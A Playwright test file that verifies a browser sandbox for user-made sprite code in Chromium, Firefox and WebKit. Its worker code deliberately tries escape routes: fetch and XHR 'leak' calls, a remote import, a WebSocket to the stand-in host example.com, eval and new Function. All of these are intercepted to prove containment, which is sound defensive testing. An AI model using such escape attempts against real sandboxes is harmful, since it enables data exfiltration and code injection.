// The two things the safety of made sprites rests on, checked in every browser Playwright can drive
// (docs/framework-api.md, "Before a public release: Firefox and Safari"; docs/architecture.md, Contract 11):
//
//   1. a worker started from memory (blob:) carries the page's <meta> content policy, so nothing in it can call
//      another site, load a script from one, or evaluate text as code;
//   2. every name on the removal list (TAKEN in app/api-source.js) is really gone in the worker a made source
//      runs in, on the global and on everything it inherits from, and a source that tries every way out finds none.
//
// One command:   npx playwright test tests/e2e/route2-browsers.spec.mjs
// A browser that is not installed is skipped, and says how to install it: npx playwright install firefox webkit
// (Only Chromium was installed where this was written, 2026-11-18: Firefox and Safari have NOT been verified.)
// example.com stands for "another site"; the test answers it itself and records what reaches it.
import fs from 'node:fs';
import { test, expect, chromium, firefox, webkit } from '@playwright/test';
import { TAKEN } from '../../app/api-source.js';
import { goodSprite } from '../fixtures/api/sources.mjs';
import { EVERY_WAY_OUT } from '../fixtures/api/hostile.mjs';

const BROWSERS = { chromium, firefox, webkit };
const installed = (type) => { try { return fs.existsSync(type.executablePath()); } catch { return false; } };

/** A made source that looks, from inside its worker, for every name on the removal list, and reports through its blurb. */
const LOOKS_FOR_TAKEN = `const names = ${JSON.stringify(TAKEN)};
const found = names.filter((n) => { try { return typeof globalThis[n] !== 'undefined'; } catch { return true; } });
const inherited = [];
for (let o = globalThis; o; o = Object.getPrototypeOf(o)) for (const n of names) { const d = Object.getOwnPropertyDescriptor(o, n); if (d && (d.get || d.set || d.value !== undefined)) inherited.push(n); }
const REPORT = JSON.stringify({ found, inherited, evalWorks: (() => { try { return (0, eval)('1 + 1') === 2; } catch { return false; } })() });
${goodSprite('rv-taken').replace("blurb: 'A cut gem that floats and glints.'", 'blurb: REPORT')}`;

for (const [name, type] of Object.entries(BROWSERS)) {
  test.describe(name, () => {
    let browser = null, context = null, page = null, reached = [];
    test.beforeAll(async ({ baseURL }) => {
      if (!installed(type)) return;
      browser = await type.launch();
      context = await browser.newContext({ baseURL });
      await context.route(/^(https?|wss?):\/\/([^/]*\.)?example\.com\//, (route) => { reached.push(route.request().url()); route.fulfill({ status: 200, contentType: 'text/javascript', body: 'export default 1;' }); });
      await context.route(/fonts\.(googleapis|gstatic)\.com|favicon\.ico$/, (route) => route.fulfill({ status: 204, body: '' }));
      page = await context.newPage();
      await page.goto('/index.html#/');
      await page.waitForFunction(() => { const main = document.querySelector('#app main'); return main && !/^Loading/.test(main.textContent.trim()) && window.loadout; });
    });
    test.afterAll(async () => { await browser?.close(); });
    const skipUnlessInstalled = () => test.skip(!installed(type), `${name} is not installed here. Install it (npx playwright install ${name}) and run this file again: this check has not been made in ${name}.`);

    test('a worker started from memory carries the page\'s content policy', async () => {
      skipUnlessInstalled();
      const result = await page.evaluate(() => new Promise((done) => {
        const far = 'https://example.com/';
        const code = `const out = {}; const t = async (n, f) => { try { await f(); out[n] = 'reached'; } catch (e) { out[n] = 'stopped'; } };
          await t('fetch', () => fetch('${far}?leak=1', { mode: 'no-cors' }));
          await t('import', () => import('${far}x.js'));
          await t('eval', () => (0, eval)('1'));
          await t('function', () => new Function('return 1')());
          await t('webSocket', () => new Promise((a, b) => { const w = new WebSocket('wss://example.com/'); w.onopen = a; w.onerror = b; }));
          await t('xhr', () => new Promise((a, b) => { const x = new XMLHttpRequest(); x.open('GET', '${far}?leak=2'); x.onload = a; x.onerror = b; x.send(); }));
          postMessage(out);`;
        let w;
        try { w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })), { type: 'module' }); } catch (e) { done({ error: `a module worker could not be started from memory: ${e}` }); return; }
        w.onmessage = (e) => done(e.data);
        w.onerror = (e) => done({ error: `the worker failed: ${e.message || e.type}` });
        setTimeout(() => done({ error: 'the worker never answered' }), 15000);
      }));
      expect(result, `in ${name}, a worker started from memory must be under the page's policy`).toEqual({ fetch: 'stopped', import: 'stopped', eval: 'stopped', function: 'stopped', webSocket: 'stopped', xhr: 'stopped' });
      expect(reached, 'nothing reached the other site').toEqual([]);
    });

    test('every name on the removal list is gone where a made source runs', async () => {
      skipUnlessInstalled();
      const made = await page.evaluate((src) => window.loadout.make.sprite(src), LOOKS_FOR_TAKEN);
      expect(made, `make.sprite must work in ${name} (it needs module workers that can import from memory): ${JSON.stringify(made.errors)}`).toMatchObject({ id: 'rv-taken', ok: true });
      const report = JSON.parse((await page.evaluate(() => window.loadout.assets.get('rv-taken'))).asset.description);
      expect(report.found, `still reachable as a global in ${name}`).toEqual([]);
      expect(report.inherited, `still on the global or what it inherits from in ${name}`).toEqual([]);
      expect(report.evalWorks, 'text is not evaluated as code there').toBe(false);
    });

    test('a made source that tries every way out finds none', async () => {
      skipUnlessInstalled();
      const title = await page.evaluate(() => document.title);      // the home page's own title, which the made source must not change
      const made = await page.evaluate((src) => window.loadout.make.sprite(src), EVERY_WAY_OUT('rv-ways-everywhere'));
      expect(made, JSON.stringify(made.errors)).toMatchObject({ ok: true });
      const report = JSON.parse((await page.evaluate(() => window.loadout.assets.get('rv-ways-everywhere'))).asset.description);
      expect(report.has).toEqual([]);
      for (const [way, what] of Object.entries(report)) if (way !== 'has') expect(what, `${way} in ${name}`).toMatch(/^stopped: /);
      expect(reached).toEqual([]);
      expect(await page.evaluate(() => document.title)).toBe(title);
    });
  });
}
